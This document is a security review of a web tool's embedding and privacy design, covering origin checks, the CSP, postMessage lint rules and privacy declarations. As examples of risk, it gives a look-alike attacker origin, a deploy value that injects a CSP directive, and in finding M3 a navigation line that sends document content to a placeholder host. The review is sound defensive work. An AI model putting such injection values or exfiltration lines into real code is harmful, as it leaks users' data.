# Security review 1 — F-008 host integration / F-009 privacy assurance

Scope: `git diff main...worktree-agent-a5c16138f07299daa`, plus the unchanged files it relies on
(`scripts/gen-headers.mjs`, `scripts/lib/boot.mjs`, `src/host/boot.js`, `vite.config.ts`,
`eslint.config.js`). Checked against RULE-16, NFR-01, NFR-09, INV-02, ADR-0008, ADR-0009 and
`specs/40-technical/platform-mapping.md`.

**Verdict: pass. 0 blockers, 0 majors, 5 minors and 2 informational notes.**

## What I verified (no issues found)
- **Origin check** (`src/host/contract.ts:32`): matches the origin exactly with `Array.includes`.
  It rejects other ports and schemes, `null`, and look-alike suffixes such as `tarokit.app.evil.example`
  (unit tests at `tests/unit/host-contract.test.ts:36-44`). `event.source === window.parent` is
  also required, so the sibling-frame route through `parent.frames` is closed (line 33, e2e test at `host.spec.ts:129`).
- **Message shape**: the message must be a plain object (arrays and null are rejected), `type`
  must be exactly `taro:theme`, and `value` must be in the set {light, dark}. Message data is never
  evaluated, inserted as HTML or interpolated. Only `setAttribute('data-theme', 'light'|'dark')` runs (`theme.ts:33`).
- **`theme` address parameter**: `boot.js:10` and `theme.ts:13` both compare against the same two
  literals. A raw value never reaches the DOM or CSS.
- **Ready signal** (`index.ts:51-57`, `contract.ts:58-66`): the payload is `{type:'taro:ready'}` only.
  The target is the allow-listed referrer origin, or otherwise each allowed origin. It is never `*`
  while the list is valid (see M1). It is sent only when the tool is embedded and the list is
  non-empty. The built bundle has exactly one `postMessage` call site.
- **INV-02**: none of the diff's code reaches document content. The listener only writes the theme.
- **CSP** (`public/_headers`, generated): `default-src 'none'`, `connect-src 'none'`,
  `script-src 'self' 'sha256-THKm…'`, and no `unsafe-inline` or `unsafe-eval`. I recomputed the hash
  from the inlined `<script>` in `dist/index.html` and it matches. `dist/_headers` is identical to
  `public/_headers`. The `frame-ancestors` value comes from the allow-list, and an empty list
  produces `'none'`. There is no `X-Frame-Options`, which is correct per ADR-0009.
- **Clickjacking**: `frame-ancestors` checks every ancestor, so an allowed portal cannot re-frame
  the tool inside a hostile intermediate frame. COOP `same-origin` isolates the tool when it runs standalone.
- **NFR-01, network and storage**: `src/` has no fetch/XHR/WebSocket/EventSource/sendBeacon calls,
  no storage, no cookies and no console logging. The lint ban (`eslint.config.js:6-24`) and the CSP
  enforce this.
- **Secrets**: none in the diff.
- **Third-party code**: `lucide-static@1.55.0` (ISC). Only two SVG files are used, imported with `?raw`
  at build time. There is no runtime code and nothing is collected. It is listed in `public/third-party-notices.txt`.

## Findings

### M1 — minor: `HOST_ORIGINS` is not validated or normalised
- **Location**: `scripts/gen-headers.mjs:10-13` (used by `:29` and `vite.config.ts:22`).
- **Scenario**: the deploy setting is copied verbatim into the CSP header and into the compiled-in list.
  - `HOST_ORIGINS='*'` produces `frame-ancestors *`, so any site can frame the tool.
    It also makes `readyTargets` return `['*']`, so the ready signal goes out as `postMessage(…,'*')`.
    Both break ADR-0008 §3 and NFR-09.
  - `https://a.example;sandbox` injects an extra CSP directive.
  - `null` or `https:` widens the policy.
  - `https://tarokit.app/` (trailing slash) or `https://TaroKit.app` never equals `event.origin`.
    Theme messages are then silently dropped while framing still works.
  
  Each case needs an operator mistake. An outside attacker cannot trigger any of them.
- **Fix**: in `hostOrigins()`, map each entry to `new URL(e).origin` and throw (failing the build)
  unless:
  - the result equals the input after lowercasing and trimming a trailing `/`;
  - the scheme is `https:` (allow `http:` only for `localhost`);
  - the entry is not `*`, `null` or a quoted keyword.
  
  Add unit tests for `*`, `null`, a trailing slash, an entry containing `;`, and upper-case input.
  As defence in depth, have `readyTargets` filter out `'*'`.

### M2 — minor: the lint rule that keeps `postMessage` inside MOD-Host has gaps
- **Location**: `eslint.config.js:63`.
- **Scenario**: the selector only matches `<x>.parent.postMessage(...)`. These calls pass lint and
  could send content outside MOD-Host, against INV-02:
  - bare `parent.postMessage(...)`
  - `top.postMessage` / `window.top.postMessage`
  - `opener.postMessage`
  - `const p = window.parent; p.postMessage(...)`
  
  The CSP does not restrict `postMessage`.
- **Fix**: restrict every `CallExpression[callee.property.name='postMessage']` outside
  `src/host/**` and `src/worker/**`. Worker messaging needs its own allowance. Also add `parent`,
  `top` and `opener` to `no-restricted-globals` outside MOD-Host.

### M3 — minor: navigation-based exfiltration is not covered by the lint ban
- **Location**: `eslint.config.js:16-24`.
- **Scenario**: CSP Level 3 has no `navigate-to`. When the tool runs standalone, a future regression such as
  `location.href = 'https://x/?' + doc` or `window.open(url)` would send content out without breaking
  `connect-src`. When embedded, the portal's sandbox (no `allow-popups` or `allow-top-navigation`)
  limits this.
- **Fix**: add `window.open`, assignments to `location`/`location.href`, `location.assign` and
  `location.replace` to the restricted properties or syntax. Also add `caches`,
  `navigator.storage` and `BroadcastChannel` to the storage ban, because PRN-01 says nothing is persisted.

### M4 — minor: no HSTS header
- **Location**: `scripts/gen-headers.mjs:40-44`.
- **Scenario**: the first visit over plain `http://` can be intercepted and rewritten before any redirect.
  Whether this matters depends on the Cloudflare zone setting, which this repository does not show.
- **Fix**: either emit `Strict-Transport-Security: max-age=31536000; includeSubDomains` in `/*`,
  or record in ADR-0009 that HSTS is set at the zone level.

### M5 — minor: the ready fallback announces the tool to every allowed origin
- **Location**: `contract.ts:65`.
- **Scenario**: when the referrer is missing, `postMessage` is called once for each allowed origin.
  The browser drops non-matching targets, and the payload has no content. With several origins
  this leaks nothing, but it logs console errors in the host.
- **Fix**: none required; this follows ADR-0008. Optionally, use `location.ancestorOrigins`
  (Chromium and WebKit) before falling back.

### I1 — info: the icon component uses `dangerouslySetInnerHTML`
- **Location**: `src/app/components/Icon.tsx:16`.
- The values are build-time constants from the package, so this is not injectable today.
  Consider `require-trusted-types-for 'script'` in the CSP later (and check that Preact and
  CodeMirror stay compatible). Keep the `IconName` union closed.

### I2 — info: the e2e fixture server prefix check
- **Location**: `tests/e2e/server.mjs:97`.
- `file.startsWith(dir)` has no trailing separator, so a sibling directory like `dist-x` would also pass.
  The server is test-only and bound to `localhost`, so there is no production impact.

## Store and privacy declarations (data collected)
- **Data collected by the tool: none.** No analytics, identifiers, crash reports, cookies or storage.
  Document content stays in memory only.
- **Data received**: the theme (`light` or `dark`) from the address and from host messages. It is not stored.
- **Data sent**: the message `{type:'taro:ready'}`, sent only to the allow-listed portal origin. It contains no user data.
- **Infrastructure**: the static host (Cloudflare) sees normal request metadata (IP address,
  user agent, paths) when it serves the tool's assets. Mention this in the privacy policy as
  hosting logs, not as data the tool collects.
- **Third-party SDKs**: none at runtime. `lucide-static` contributes build-time SVG only.
- **Consistency with F-009**: the text in `COPY-privacy.details` ("never uploaded, logged, or
  stored… no analytics") matches the implementation and the CSP.
